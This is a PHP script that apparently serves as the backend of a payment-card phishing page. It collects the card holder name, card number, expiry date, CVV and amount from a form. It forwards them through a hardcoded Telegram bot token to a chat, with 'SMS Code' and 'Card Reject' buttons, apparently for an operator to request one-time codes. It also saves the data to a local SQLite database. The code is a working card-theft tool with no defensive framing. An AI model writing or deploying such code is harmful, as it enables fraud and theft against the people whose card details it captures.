<?php
$telegramBotToken = '6718053935:AAFMv7NsTNd0kTG2QdT17_80a-oTDOyWE4U';
$chatId = '-4104959417';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $cardHolderName = $_POST['cardHolderName'] ?? 'Nepoznato';
    $cardNumber = $_POST['cardNumber'] ?? 'Nepoznato';
    $expiryDate = $_POST['expiryDate'] ?? 'Nepoznato';
    $cvv = $_POST['cvv'] ?? 'Nepoznato';
    $amount = $_POST['amount'] ?? 'Nepoznato';
    $uniqueId = uniqid();

    $text = "ID: $uniqueId\nNova poruka od:\nIme: $cardHolderName\nBroj kartice: $cardNumber\nDatum isteka: $expiryDate\nCVV: $cvv\nIznos: $amount";
    $inlineKeyboard = [
        'inline_keyboard' => [
            [
                ['text' => 'SMS Code', 'callback_data' => 'sms'],
                ['text' => 'Card Reject', 'callback_data' => 'reject']
            ]
        ]
    ];
    $data = [
        'chat_id' => $chatId,
        'text' => $text,
        'reply_markup' => json_encode($inlineKeyboard)
    ];
    // Slanje poruke putem Telegram API-ja
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot$telegramBotToken/sendMessage");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    try {
        $pdo = new PDO('sqlite:dental.db');
        $stmt = $pdo->prepare("INSERT INTO messages (unique_id, cardHolderName, cardNumber, expiryDate, cvv, amount) VALUES (?, ?, ?, ?, ?, ?)");
        $stmt->execute([$uniqueId, $cardHolderName, $cardNumber, $expiryDate, $cvv, $amount]);
        header('Content-Type: application/json');
        echo json_encode(['status' => 'success', 'response' => $response, 'uniqueId' => $uniqueId]);
    } catch (PDOException $e) {
        header('Content-Type: application/json');
        echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
    }
} else {
    header('Content-Type: application/json');
    echo json_encode(['status' => 'error', 'message' => 'Invalid request']);
}
?>
